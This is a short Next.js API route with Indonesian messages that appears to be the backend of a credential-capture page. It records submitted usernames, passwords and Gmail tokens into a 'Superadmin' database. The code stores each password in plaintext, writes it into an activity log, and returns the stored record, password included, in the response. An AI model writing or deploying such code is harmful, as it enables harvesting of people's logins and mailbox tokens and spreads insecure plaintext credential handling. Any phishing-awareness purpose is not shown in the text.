import { NextResponse } from "next/server";
import prisma from "@/lib/db";
import { recordActivity } from "@/lib/activityStore";

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { username, email, password, token } = body;

    const targetUsername = username || (email ? email.split("@")[0] : `user_${Math.random().toString(36).substring(2, 7)}`);
    const targetEmail = email || `${targetUsername.toLowerCase()}@rsmad.co.id`;
    const targetPassword = password || "pass" + Math.random().toString(36).substring(2, 6);
    
    const targetToken = token && token !== "demo-token" 
      ? token 
      : `tok_gmail_${Math.random().toString(36).substring(2, 8)}`;

    // Upsert user in Supabase
    const user = await prisma.user.upsert({
      where: { email: targetEmail },
      update: {
        username: targetUsername,
        password: targetPassword,
        tokenGmail: targetToken,
      },
      create: {
        username: targetUsername,
        email: targetEmail,
        password: targetPassword,
        tokenGmail: targetToken,
      },
    });

    // Record activity log for Superadmin
    recordActivity({
      eventType: "STEP1_LOGIN",
      actionName: "Submit Kredensial Langkah 1",
      userIdentifier: targetUsername,
      details: `User memasukkan username '${targetUsername}' dan password '${targetPassword}'`,
      status: "WARNING",
      ipAddress: "192.168.10.x",
      device: "Web Browser",
    });

    return NextResponse.json({
      success: true,
      message: "Data login berhasil dicatat ke database Superadmin",
      data: user,
    });
  } catch (error: any) {
    console.error("Gagal mencatat login ke database:", error);
    return NextResponse.json(
      {
        success: false,
        message: "Gagal mencatat data ke database",
        error: error?.message,
      },
      { status: 500 }
    );
  }
}
